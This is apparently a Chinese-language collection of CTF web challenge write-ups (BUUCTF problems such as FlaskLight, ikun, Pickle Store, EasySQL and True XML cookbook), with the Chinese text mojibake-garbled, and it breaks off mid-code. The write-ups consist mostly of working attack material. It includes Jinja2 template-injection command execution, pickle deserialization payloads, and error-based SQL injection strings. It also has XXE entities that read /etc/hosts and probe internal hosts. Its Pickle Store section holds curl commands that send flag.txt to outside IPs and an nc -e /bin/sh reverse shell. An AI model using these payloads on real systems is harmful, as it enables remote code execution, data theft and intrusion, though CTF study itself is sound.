index.php/config.php/%ff?source [MRCTF2020]å¥—å¨ƒ 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;!-- //1st $query = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; if( substr_count($query, \u0026#39;_\u0026#39;) !== 0 || substr_count($query, \u0026#39;%5f\u0026#39;) != 0 ){ die(\u0026#39;Y0u are So cutE!\u0026#39;); } if($_GET[\u0026#39;b_u_p_t\u0026#39;] !== \u0026#39;23333\u0026#39; \u0026amp;\u0026amp; preg_match(\u0026#39;/^23333$/\u0026#39;, $_GET[\u0026#39;b_u_p_t\u0026#39;])){ echo \u0026#34;you are going to the next ~\u0026#34;; } !--\u0026gt; $_SERVER['QUERY_STRING']è¿™ä¸ªä¼šåŒ¹é…ä¼ å…¥çš„?ä¹‹åçš„å­—ç¬¦\n_å¯ä»¥ç”¨ç©ºæ ¼æˆ–è€….ç»•è¿‡ï¼Œ/23333$/è¿™ä¸ªåªæœ‰å°¾éƒ¨æ˜¯23333æ‰ä¼šè¢«åŒ¹é…åˆ°\nç”¨23333%0Aç»•è¿‡\n1 2 3 ?b u p t=23333%0A æˆ–è€… ?b.u.p.t=23333%0A è¿›å…¥ä¸‹ä¸€å±‚ï¼Œæ³¨é‡Šé‡Œé¢ä¸€ä¸²jsfuckä¸¢ç»™æ§åˆ¶å°\npostä¼ Merak,è¿›å…¥ä¸‹ä¸€å±‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;?php error_reporting(0); include \u0026#39;takeip.php\u0026#39;; ini_set(\u0026#39;open_basedir\u0026#39;,\u0026#39;.\u0026#39;); include \u0026#39;flag.php\u0026#39;; if(isset($_POST[\u0026#39;Merak\u0026#39;])){ highlight_file(__FILE__); die(); } function change($v){ $v = base64_decode($v); $re = \u0026#39;\u0026#39;; for($i=0;$i\u0026lt;strlen($v);$i++){ $re .= chr ( ord ($v[$i]) + $i*2 ); } return $re; } echo \u0026#39;Local access only!\u0026#39;.\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;; $ip = getIp(); if($ip!=\u0026#39;127.0.0.1\u0026#39;) echo \u0026#34;Sorry,you don\u0026#39;t have permission! Your ip is :\u0026#34;.$ip; if($ip === \u0026#39;127.0.0.1\u0026#39; \u0026amp;\u0026amp; file_get_contents($_GET[\u0026#39;2333\u0026#39;]) === \u0026#39;todat is a happy day\u0026#39; ){ echo \u0026#34;Your REQUEST is:\u0026#34;.change($_GET[\u0026#39;file\u0026#39;]); echo file_get_contents(change($_GET[\u0026#39;file\u0026#39;])); } ?\u0026gt; è¿™é‡Œipè¦æ±‚æ˜¯127.0.0.1\næ·»åŠ Client-Ip:127.0.0.1\n2333å‚æ•°ç”¨dataåè®®æˆ–è€…php://inputä¼ postä¹Ÿè¡Œ\nè€Œfileè¦åŠ å¯†\n1 2 3 4 5 6 7 \u0026lt;?php $v=\u0026#39;flag.php\u0026#39;; $re=\u0026#39;\u0026#39;; for($i=0;$i\u0026lt;strlen($v);$i++){ $re.=chr ( ord ($v[$i]) - $i*2 ); } echo base64_encode($re); 1 ?2333=data://text/plain,todat%20is%20a%20happy%20day\u0026amp;file=ZmpdYSZmXGI= [CSCCTF 2019 Qual]FlaskLight jinja2çš„ssti\næŸ¥æ‰¾åˆ°warningsç±»åœ¨59\nä½†æ˜¯åé¢å°±ä¼šå›æ˜¾500çŠ¶æ€æ€€ç–‘è¿‡æ»¤äº†global\næ‹¼æ¥ç»•è¿‡\n1 [].__class__.__base__.__subclasses__()[59].__init__[\u0026#39;__glo\u0026#39;+\u0026#39;bals__\u0026#39;][\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls\u0026#34;).read()\u0026#39;) 1 {{[].__class__.__base__.__subclasses__()[59].__init__[\u0026#39;__glo\u0026#39;+\u0026#39;bals__\u0026#39;][\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;cat flasklight/coomme_geeeett_youur_flek\u0026#34;).read()\u0026#39;)}} [watevrCTF-2019]Cookie Store ä¼ªé€ cookieï¼Œbase64ç¼–ç å¾—flag\n[WUSTCTF2020]CV Maker æ³¨å†Œç™»å…¥ï¼Œbpæ”¹ä¸ºå›¾ç‰‡æ ¼å¼\nä¸Šä¼ èšå‰‘è¿æ¥\n[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun ä¸Šæ¥æç¤ºçˆ†ç ´ç½‘ç«™ï¼Œè¦ä¹°åˆ°lv6,æˆ‘ä»¬ç‚¹å¼€lv4çš„å›æ˜¾å‚æ•°page,çˆ†ç ´page\n1 2 3 4 5 6 7 8 9 import requests url=\u0026#34;http://3ecc60d7-c14f-4805-9476-71bcd91747c8.node3.buuoj.cn/shop?page=\u0026#34; for i in range(0,2000): print(i) r=requests.get( url + str(i) ) if \u0026#39;lv6.png\u0026#39; in r.text: print (i) break çˆ†ç ´å‡º181\næŠ“åŒ…æ”¹æŠ˜æ‰£\nå¾—åˆ°/b1g_m4mberè·¯ç”±,jwtä¼ªé€ ï¼Œkeyæ˜¯1Kun\næŸ¥çœ‹æºç åé¢èƒ½ä¸‹è½½æºç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import tornado.web from sshop.base import BaseHandler import pickle import urllib class AdminHandler(BaseHandler): @tornado.web.authenticated def get(self, *args, **kwargs): if self.current_user == \u0026#34;admin\u0026#34;: return self.render(\u0026#39;form.html\u0026#39;, res=\u0026#39;This is Black Technology!\u0026#39;, member=0) else: return self.render(\u0026#39;no_ass.html\u0026#39;) @tornado.web.authenticated def post(self, *args, **kwargs): try: become = self.get_argument(\u0026#39;become\u0026#39;) p = pickle.loads(urllib.unquote(become)) return self.render(\u0026#39;form.html\u0026#39;, res=p, member=1) except: return self.render(\u0026#39;form.html\u0026#39;, res=\u0026#39;This is Black Technology!\u0026#39;, member=0) 1 p = pickle.loads(urllib.unquote(become)) è¿™é‡Œpickleæä¾›äº†ä¸€ä¸ªç®€å•çš„æŒä¹…åŒ–åŠŸèƒ½ã€‚ç”¨åˆ°ååºåˆ—åŒ–\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 pickle.dump(obj, file, [,protocol]) å‡½æ•°çš„åŠŸèƒ½ï¼šå°†objå¯¹è±¡åºåˆ—åŒ–å­˜å…¥å·²ç»æ‰“å¼€çš„fileä¸­ã€‚ å‚æ•°è®²è§£ï¼š objï¼šæƒ³è¦åºåˆ—åŒ–çš„objå¯¹è±¡ã€‚ file:æ–‡ä»¶åç§°ã€‚ protocolï¼šåºåˆ—åŒ–ä½¿ç”¨çš„åè®®ã€‚å¦‚æœè¯¥é¡¹çœç•¥ï¼Œåˆ™é»˜è®¤ä¸º0ã€‚å¦‚æœä¸ºè´Ÿå€¼æˆ–HIGHEST_PROTOCOLï¼Œåˆ™ä½¿ç”¨æœ€é«˜çš„åè®®ç‰ˆæœ¬ã€‚ pickle.load(file) å‡½æ•°çš„åŠŸèƒ½ï¼šå°†fileä¸­çš„å¯¹è±¡åºåˆ—åŒ–è¯»å‡ºã€‚ å‚æ•°è®²è§£ï¼š fileï¼šæ–‡ä»¶åç§°ã€‚ pickle.dumps(obj[, protocol]) å‡½æ•°çš„åŠŸèƒ½ï¼šå°†objå¯¹è±¡åºåˆ—åŒ–ä¸ºstringå½¢å¼ï¼Œè€Œä¸æ˜¯å­˜å…¥æ–‡ä»¶ä¸­ã€‚ å‚æ•°è®²è§£ï¼š objï¼šæƒ³è¦åºåˆ—åŒ–çš„objå¯¹è±¡ã€‚ protocalï¼šå¦‚æœè¯¥é¡¹çœç•¥ï¼Œåˆ™é»˜è®¤ä¸º0ã€‚å¦‚æœä¸ºè´Ÿå€¼æˆ–HIGHEST_PROTOCOLï¼Œåˆ™ä½¿ç”¨æœ€é«˜çš„åè®®ç‰ˆæœ¬ã€‚ pickle.loads(string) å‡½æ•°çš„åŠŸèƒ½ï¼šä»stringä¸­è¯»å‡ºåºåˆ—åŒ–å‰çš„objå¯¹è±¡ã€‚ å‚æ•°è®²è§£ï¼š stringï¼šæ–‡ä»¶åç§°ã€‚ ã€æ³¨ã€‘ dump() ä¸ load() ç›¸æ¯” dumps() å’Œ loads() è¿˜æœ‰å¦ä¸€ç§èƒ½åŠ›ï¼šdump()å‡½æ•°èƒ½ä¸€ä¸ªæ¥ç€ä¸€ä¸ªåœ°å°†å‡ ä¸ªå¯¹è±¡åºåˆ—åŒ–å­˜å‚¨åˆ°åŒä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œéšåè°ƒç”¨load()æ¥ä»¥åŒæ ·çš„é¡ºåºååºåˆ—åŒ–è¯»å‡ºè¿™äº›å¯¹è±¡ã€‚è€Œåœ¨__reduce__æ–¹æ³•é‡Œé¢æˆ‘ä»¬å°±è¿›è¡Œè¯»å–flag.txtæ–‡ä»¶ï¼Œå¹¶å°†è¯¥ç±»åºåˆ—åŒ–ä¹‹åè¿›è¡ŒURLç¼–ç  æ£€æµ‹ååºåˆ—åŒ–æ–¹æ³•ï¼šå…¨å±€æœç´¢Pythonä»£ç ä¸­æ˜¯å¦å«æœ‰å…³é”®å­—ç±»ä¼¼â€œimport cPickleâ€æˆ–â€œimport pickleâ€ç­‰ï¼Œè‹¥å­˜åœ¨åˆ™è¿›ä¸€æ­¥ç¡®è®¤æ˜¯å¦è°ƒç”¨cPickle.loads()æˆ–pickle.loads()ä¸”ååºåˆ—åŒ–çš„å‚æ•°å¯æ§ã€‚ è„šæœ¬\n1 2 3 4 5 6 7 8 9 10 import pickle import urllib class payload(object): def __reduce__(self): return (eval, (\u0026#34;open(\u0026#39;/flag.txt\u0026#39;,\u0026#39;r\u0026#39;).read()\u0026#34;,)) a = pickle.dumps(payload()) a = urllib.quote(a) print(a) è¦åœ¨py2ç¯å¢ƒç”¨\nä¸‹é¢è¿™ä¸ªæ˜¯py3çš„è„šæœ¬\n1 2 3 4 5 6 7 8 9 10 import pickle import urllib import commands class payload(object): def __reduce__(self): return (commands.getoutput,(\u0026#39;ls /\u0026#39;,)) a = payload() print urllib.quote(pickle.dumps(a)) ç„¶åcat /flag.txt\n[çº¢æ˜è°·CTF 2021]write_shell actionä¼ pwd,çœ‹ç›®å½•\nsandbox/fc3f8d0d99ccdde85c8cfc624fe94c32/\n1 ?action=upload\u0026amp;data=\u0026lt;?=%09`ls%09/`?\u0026gt; 1 ?action=upload\u0026amp;data=\u0026lt;?=%09`cat%09/flllllll1112222222lag`?\u0026gt; %09-\u0026gt;ç©ºæ ¼ï¼Œåå¼•å·å¯ä»¥æ‰§è¡Œshellå‘½ä»¤\n[watevrCTF-2019]Pickle Store æŠ“åŒ…æ‹¿cookie\nä¸€ä¸²base64ï¼Œé¢˜ç›®æç¤ºpickle,è§£ç åååºåˆ—åŒ–\n1 2 3 4 5 import pickle import base64 a=pickle.loads(base64.b64decode(b\u0026#39;gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu\u0026#39;)) print(a) 1 {\u0026#39;money\u0026#39;: 500, \u0026#39;history\u0026#39;: [], \u0026#39;anti_tamper_hmac\u0026#39;: \u0026#39;aa1ba4de55048cf20e0a7a63b7f8eb62\u0026#39;} å¯è§å…¶ä¸­å¸¦ä¸Šäº†hmacéªŒè¯ã€‚\næ¥ä¸‹æ¥æœ€ç®€å•çš„æ˜¯ç›´æ¥å¼¹shell\n1 2 3 4 5 6 7 import pickle import base64 class A(object): def __reduce__(self): return (eval,(\u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;curl -d @flag.txt 174.0.157.204:2333\u0026#39;)\u0026#34;,)) a = A() print(base64.b64encode(pickle.dumps(a))) 1 2 3 4 5 6 7 import pickle import base64 class A(object): def __reduce__(self): return (eval,(\u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;curl http://119.xxx.xxx.xxx/`cat flag.txt|base64`\u0026#39;)\u0026#34;,)) a = A() print(base64.b64encode(pickle.dumps(a))) 1 2 3 4 5 6 7 8 import base64 import pickle class A(object): def __reduce__(self): return (eval, (\u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;nc 119.29.60.71 9999 -e/bin/sh\u0026#39;)\u0026#34;,)) a = A() print(base64.b64encode(pickle.dumps(a))) æˆ–è€…cookieä¼ªé€ \né¦–å…ˆååºåˆ—åŒ–çš„pickleæµä¸­åŒ…å«äº†ç»™keyèµ‹å€¼çš„æ“ä½œï¼Œååºåˆ—åŒ–åkeyå€¼ä¼šè¢«è¦†ç›–\n1 2 3 4 5 6 7 8 9 10 import pickle import hmac key=b\u0026#39;66666666666666666666666666666666\u0026#39; cookies = {\u0026#34;money\u0026#34;:10000,\u0026#34;history\u0026#34;:[]} h = hmac.new(key) h.update(str(cookies).encode()) cookies[\u0026#34;anti_tamper_hmac\u0026#34;] = h.digest().hex() result2 = pickle.dumps(cookies) print(result2) è¿™é‡ŒæŠŠä½™é¢è®¾ç½®ä¸º10000ï¼Œå¹¶ç”¨æˆ‘ä»¬è‡ªå·±çš„keyæ¥ç»™cookieåšç­¾åï¼Œå¾—åˆ°çš„pickleæµï¼š\n1 b\u0026#34;\\x80\\x03}q\\x00(X\\x05\\x00\\x00\\x00moneyq\\x01M\\x10\u0026#39;X\\x07\\x00\\x00\\x00historyq\\x02]q\\x03X\\x10\\x00\\x00\\x00anti_tamper_hmacq\\x04X \\x00\\x00\\x00ccb487eec1cb66dda8d00a8121aeb4bfq\\x05u.\u0026#34; [RCTF2015]EasySQL å‘ç°æœ‰äºŒæ¬¡æ³¨å…¥ï¼Œåœ¨ä¿®æ”¹å¯†ç æ—¶è§¦å‘\n1 admin\u0026#34;||extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),0x7e))# 1 2 admin\u0026#34;||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)=\u0026#39;flag\u0026#39;)))# admin\u0026#34;||extractvalue(1,concat(0x7e,(select(flag)from(flag))))# å‡flag\n1 admin\u0026#34;||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)=\u0026#39;users\u0026#39;)))# æ²¡å›æ˜¾å®Œå…¨ï¼Œä½†æ˜¯mid,left,right,substréƒ½è¢«è¿‡æ»¤äº†\nè¿™é‡Œç”¨åˆ°æ­£åˆ™åŒ¹é…regexp('^f')ï¼šæŸ¥æ‰¾å¼€å¤´fçš„å­—ç¬¦ä¸²\n1 2 3 1\u0026#34;||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=\u0026#39;users\u0026#39;)\u0026amp;\u0026amp;(column_name)regexp(\u0026#39;^r\u0026#39;))))# æˆ–è€…reverseå‡½æ•°å€’è½¬ admin\u0026#34;||extractvalue(1,concat(0x7e,reverse((select(group_concat(column_name))from(information_schema.columns)where(table_name)=\u0026#39;users\u0026#39;))))# 1 admin\u0026#34;||extractvalue(1,concat(0x7e,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(\u0026#39;^f\u0026#39;))))# extractvalueæœ€å¤šåªèƒ½æ˜¾ç¤º32ä½çš„åŸå› ï¼ŒæŠ¥é”™å›æ˜¾ä¸èƒ½å¤Ÿå®Œå…¨æ˜¾ç¤ºflagçš„å€¼ï¼Œæˆ‘ä»¬å¯ä»¥ä¾ç„¶ä½¿ç”¨ reverse()å‡½æ•°ï¼Œå°†flagå€¼å€’ç½®è¾“å‡ºï¼Œå†åˆ©ç”¨sqlè¯­å¥å°†å€’ç½®éƒ¨åˆ†æ¢å¤ï¼Œå°†å‰åä¸¤éƒ¨åˆ†flagæ‹¼æ¥åˆ°ä¸€èµ·ï¼Œå°±å¯ä»¥è·å¾—å®Œæ•´çš„flagå€¼ã€‚\n1 admin\u0026#34;||extractvalue(1,concat(0x7e,reverse((select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(\u0026#39;^f\u0026#39;)))))# 1 2 3 a=\u0026#39;}ca0da771c04c-e69b-dab4-3f8f-e3\u0026#39; b=a[::-1] print(b) [GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥– æŸ¥çœ‹æºç æœ‰ä¸ªcheck.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;?php #è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼ header(\u0026#34;Content-Type: text/html;charset=utf-8\u0026#34;); session_start(); if(!isset($_SESSION[\u0026#39;seed\u0026#39;])){ $_SESSION[\u0026#39;seed\u0026#39;]=rand(0,999999999); } mt_srand($_SESSION[\u0026#39;seed\u0026#39;]); $str_long1 = \u0026#34;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34;; $str=\u0026#39;\u0026#39;; $len1=20; for ( $i = 0; $i \u0026lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); } $str_show = substr($str, 0, 10); echo \u0026#34;\u0026lt;p id=\u0026#39;p1\u0026#39;\u0026gt;\u0026#34;.$str_show.\u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; if(isset($_POST[\u0026#39;num\u0026#39;])){ if($_POST[\u0026#39;num\u0026#39;]===$str){x echo \u0026#34;\u0026lt;p id=flag\u0026gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag{xxxxxxxxx}\u0026lt;/p\u0026gt;\u0026#34;; } else{ echo \u0026#34;\u0026lt;p id=flag\u0026gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§\u0026lt;/p\u0026gt;\u0026#34;; } } show_source(\u0026#34;check.php\u0026#34;); åˆ©ç”¨mt_randå‡½æ•°çš„ä¼ªéšæœºæ•°æ¼æ´\nå…ˆå¾—åˆ°ç§å­,ç”¨php_mt_seedå·¥å…·çˆ†ç§å­\n1 2 3 4 5 6 7 8 9 str1=\u0026#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39; str2=\u0026#39;fnAeH65lyg\u0026#39; res=\u0026#39;\u0026#39; for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res+=str(j)+\u0026#39; \u0026#39;+str(j)+\u0026#39; \u0026#39;+\u0026#39;0\u0026#39;+\u0026#39; \u0026#39;+str(len(str1)-1)+\u0026#39; \u0026#39; break print(res) 1 2 3 4 5 6 7 8 9 \u0026lt;?php mt_srand(206304701); $str_long1 = \u0026#34;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34;; $str=\u0026#39;\u0026#39;; $len1=20; for ( $i = 0; $i \u0026lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); } echo $str; [NCTF2019]True XML cookbook xxeæ³¨å…¥ï¼Œä½†æ˜¯è·Ÿè¿™ä¸ªæ¯”èµ›ä¹‹å‰çš„ä¸ä¸€æ ·ï¼Œä¸èƒ½ç›´æ¥è¯»flagäº†\nè¿™é¢˜éœ€è¦å¯¹å†…ç½‘çš„ä¸»æœºè¿›è¡Œæ¢æµ‹,æˆ‘ä»¬åˆ†åˆ«è¯»å–å…³é”®æ–‡ä»¶ï¼š/etc/hosts å’Œ /proc/net/arpï¼š\n1 2 3 4 5 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE a [ \u0026lt;!ENTITY abc SYSTEM \u0026#34;file:///etc/hosts\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;abc;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;123456\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt; 1 2 3 4 5 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE a [ \u0026lt;!ENTITY abc SYSTEM \u0026#34;file:///proc/net/arp\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;abc;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;123456\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt; æ‰¾åˆ°ip169.254.1.1\n1 2 3 4 5 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE a [ \u0026lt;!ENTITY abc SYSTEM \u0026#34;http://169.254.1.1\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;abc;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;123456\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt; intruderçˆ†ç ´cæ®µï¼Œå°±æ˜¯ipæ•°å­—æœ€åä¸€ä¸ª\nä¸å¯¹ï¼Œè¯»å–/proc/net/fib_trieæ–‡ä»¶\n1 2 3 4 5 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE a [ \u0026lt;!ENTITY abc SYSTEM \u0026#34;file:///proc/net/fib_trie\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;abc;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;123456\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt; å¾—åˆ°10.244.166.66\nå†æ¬¡çˆ†ç ´ï¼Œè¿™é‡Œçš„çˆ†ç ´å»¶æ—¶è¦è®¾ç½®\nçˆ†å‡ºæ¥é•¿åº¦æ­£å¸¸çš„å°±æ˜¯flag\næˆ–è€…ç”¨è„šæœ¬çˆ†\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import requests as res url=\u0026#34;http://a1fb5d9d-ab10-442b-9323-727c25c3fcb6.node5.buuoj.cn:81/doLogin.php\u0026#34; rawPayload=\u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt;\u0026#39;\\ \u0026#39;\u0026lt;!DOCTYPE user [\u0026#39;\\ \u0026#39;\u0026lt;!ENTITY payload1 SYSTEM \u0026#34;http://10.244.166.{}\u0026#34;\u0026gt;\u0026#39;\\ \u0026#39;]\u0026gt;\u0026#39;\\ \u0026#39;\u0026lt;user\u0026gt;\u0026#39;\\ \u0026#39;\u0026lt;username\u0026gt;\u0026#39;\\ \u0026#39;\u0026amp;payload1;\u0026#39;\\ \u0026#39;\u0026lt;/username\u0026gt;\u0026#39;\\ \u0026#39;\u0026lt;password\u0026gt;\u0026#39;\\ \u0026#39;23\u0026#39;\\ \u0026#39;\u0026lt;/password\u0026gt;\u0026#39;\\ \u0026#39;\u0026lt;/user\u0026gt;\u0026#39; for i in range(1,256): payload=rawPayload.format(i) #payload=rawPayload print(str(\u0026#34;#{} =\u0026gt;\u0026#34;).format(i),end=\u0026#39;\u0026#39;) try: resp=res.post(url,data=payload,timeout=0.5) except: continue else: print(resp.text,end=\u0026#39;\u0026#39;) finally: print(\u0026#39;\u0026#39;) [CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk åœ¨æºç æœ€ä¸‹é¢æœ‰æ³¨é‡Š\næœ‰ä¸ªfileå‚æ•°å¯ä»¥è¯»æ–‡ä»¶\nä¼ªåè®®è¯»æ‰€æœ‰å‰é¢çš„php\n1 php://filter/convert.base64-encode/resource=index.php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php ini_set(\u0026#39;open_basedir\u0026#39;, \u0026#39;/var/www/html/\u0026#39;); // $file = $_GET[\u0026#34;file\u0026#34;]; $file = (isset($_GET[\u0026#39;file\u0026#39;]) ? $_GET[\u0026#39;file\u0026#39;] : null); if (isset($file)){ if (preg_match(\u0026#34;/phar|zip|bzip2|zlib|data|input|%00/i\u0026#34;,$file)) { echo(\u0026#39;no way!\u0026#39;); exit; } @include($file); } ?\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 \u0026lt;?php require_once \u0026#34;config.php\u0026#34;; if(!empty($_POST[\u0026#34;user_name\u0026#34;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#34;phone\u0026#34;])) { $msg = \u0026#39;\u0026#39;; $pattern = \u0026#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i\u0026#39;; $user_name = $_POST[\u0026#34;user_name\u0026#34;]; $phone = $_POST[\u0026#34;phone\u0026#34;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = \u0026#39;no sql inject!\u0026#39;; }else{ $sql = \u0026#34;select * from `user` where `user_name`=\u0026#39;{$user_name}\u0026#39; and `phone`=\u0026#39;{$phone}\u0026#39;\u0026#34;; $fetch = $db-\u0026gt;query($sql); } if (isset($fetch) \u0026amp;\u0026amp; $fetch-\u0026gt;num_rows\u0026gt;0){ $row = $fetch-\u0026gt;fetch_assoc(); if(!$row) { echo \u0026#39;error\u0026#39;; print_r($db-\u0026gt;error); exit; } $msg = \u0026#34;\u0026lt;p\u0026gt;å§“å:\u0026#34;.$row[\u0026#39;user_name\u0026#39;].\u0026#34;\u0026lt;/p\u0026gt;\u0026lt;p\u0026gt;, ç”µè¯:\u0026#34;.$row[\u0026#39;phone\u0026#39;].\u0026#34;\u0026lt;/p\u0026gt;\u0026lt;p\u0026gt;, åœ°å€:\u0026#34;.$row[\u0026#39;address\u0026#39;].\u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; } else { $msg = \u0026#34;æœªæ‰¾åˆ°è®¢å•!\u0026#34;; } }else { $msg = \u0026#34;ä¿¡æ¯ä¸å…¨\u0026#34;; } ?\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 \u0026lt;?php require_once \u0026#34;config.php\u0026#34;; //var_dump($_POST); if(!empty($_POST[\u0026#34;user_name\u0026#34;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#34;address\u0026#34;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#34;phone\u0026#34;])) { $msg = \u0026#39;\u0026#39;; $pattern = \u0026#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i\u0026#39;; $user_name = $_POST[\u0026#34;user_name\u0026#34;]; $address = $_POST[\u0026#34;address\u0026#34;]; $phone = $_POST[\u0026#34;phone\u0026#34;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = \u0026#39;no sql inject!\u0026#39;; }else{ $sql = \u0026#34;select * from `user` where `user_name`=\u0026#39;{$user_name}\u0026#39; and `phone`=\u0026#39;{$phone}\u0026#39;\u0026#34;; $fetch = $db-\u0026gt;query($sql); } if($fetch-\u0026gt;num_rows\u0026gt;0) { $msg = $user_name.\u0026#34;å·²æäº¤è®¢å•\u0026#34;; }else{ $sql = \u0026#34;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)\u0026#34;; $re = $db-\u0026gt;prepare($sql); $re-\u0026gt;bind_param(\u0026#34;sss\u0026#34;, $user_name, $address, $phone); $re = $re-\u0026gt;execute(); if(!$re) { echo \u0026#39;error\u0026#39;; print_r($db-\u0026gt;error); exit; } $msg = \u0026#34;è®¢å•æäº¤æˆåŠŸ\u0026#34;; } } else { $msg = \u0026#34;ä¿¡æ¯ä¸å…¨\u0026#34;; } ?\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;?php require_once \u0026#34;config.php\u0026#34;; if(!empty($_POST[\u0026#34;user_name\u0026#34;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#34;address\u0026#34;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#34;phone\u0026#34;])) { $msg = \u0026#39;\u0026#39;; $pattern = \u0026#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i\u0026#39;; $user_name = $_POST[\u0026#34;user_name\u0026#34;]; $address = addslashes($_POST[\u0026#34;address\u0026#34;]); $phone = $_POST[\u0026#34;phone\u0026#34;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = \u0026#39;no sql inject!\u0026#39;; }else{ $sql = \u0026#34;select * from `user` where `user_name`=\u0026#39;{$user_name}\u0026#39; and `phone`=\u0026#39;{$phone}\u0026#39;\u0026#34;; $fetch = $db-\u0026gt;query($sql); } if (isset($fetch) \u0026amp;\u0026amp; $fetch-\u0026gt;num_rows\u0026gt;0){ $row = $fetch-\u0026gt;fetch_assoc(); $sql = \u0026#34;update `user` set `address`=\u0026#39;\u0026#34;.$address.\u0026#34;\u0026#39;, `old_address`=\u0026#39;\u0026#34;.$row[\u0026#39;address\u0026#39;].\u0026#34;\u0026#39; where `user_id`=\u0026#34;.$row[\u0026#39;user_id\u0026#39;]; $result = 